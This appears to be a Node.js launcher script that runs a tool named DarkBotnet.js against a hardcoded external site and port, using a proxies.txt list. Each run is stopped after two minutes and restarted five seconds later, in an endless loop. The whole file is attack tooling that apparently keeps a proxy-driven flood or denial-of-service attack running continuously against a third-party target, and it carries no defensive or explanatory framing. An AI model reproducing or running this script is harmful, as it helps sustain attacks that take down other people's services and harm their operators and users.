const { exec } = require('child_process');

const url = "https://dhenme.com";
const port = "12000";
const param1 = "1";
const param2 = "1";
const proxyFile = "proxies.txt";

// Function to run the app.js script
function runScript() {
    const command = `node DarkBotnet.js ${url} ${port} ${param1} ${param2} ${proxyFile}`;
    console.log(`Starting script: ${command}`);

    const process = exec(command);

    process.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`Script exited with code ${code}`);
    });

    // Stop the script after 2 minutes (120000 milliseconds)
    setTimeout(() => {
        console.log('Stopping script...');
        process.kill(); // Terminate the script
        waitAndRestart();
    }, 120000);
}

// Function to wait for 5 seconds and restart the script
function waitAndRestart() {
    setTimeout(() => {
        console.log('Restarting script...');
        runScript();
    }, 5000);
}

// Start the process for the first time
runScript();
